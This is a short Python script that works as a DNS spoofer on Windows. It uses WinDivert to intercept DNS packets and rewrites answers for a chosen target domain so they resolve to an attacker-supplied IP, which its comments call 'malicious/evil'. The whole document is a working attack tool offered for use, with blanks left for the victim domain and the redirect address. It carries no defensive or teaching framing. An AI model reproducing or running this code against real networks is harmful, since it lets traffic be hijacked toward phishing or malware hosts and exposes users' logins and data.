#!/usr/bin/env python3

from pydivert import WinDivert
from dnslib import DNSRecord, RR, QTYPE, A

TARGET_DOMAIN = " " # Enter the website you want to spoof (e.g., www.google.com)
FAKE_IP = " " # Enter the IP address you want the spoofed domain to redirect to (malicious/evil IP)  
FILTER = "udp.DstPort == 53 or udp.SrcPort == 53"

print("[+] DNS Spoofer Running on Windows...")

with WinDivert(FILTER) as w:
    for packet in w:
        try:
            dns = DNSRecord.parse(packet.payload)

            if dns.header.qr == 1:
                qname = str(dns.q.qname).rstrip('.')

                if qname == TARGET_DOMAIN:
                    print("[+] Spoofing:", qname)

                    dns.rr = []
                    dns.add_answer(
                        RR(
                            rname=dns.q.qname,
                            rtype=QTYPE.A,
                            rclass=1,
                            ttl=60,
                            rdata=A(FAKE_IP)
                        )
                    )

                    packet.payload = dns.pack()
                    packet.recalc_checksum = True

        except Exception:
            pass

        w.send(packet)

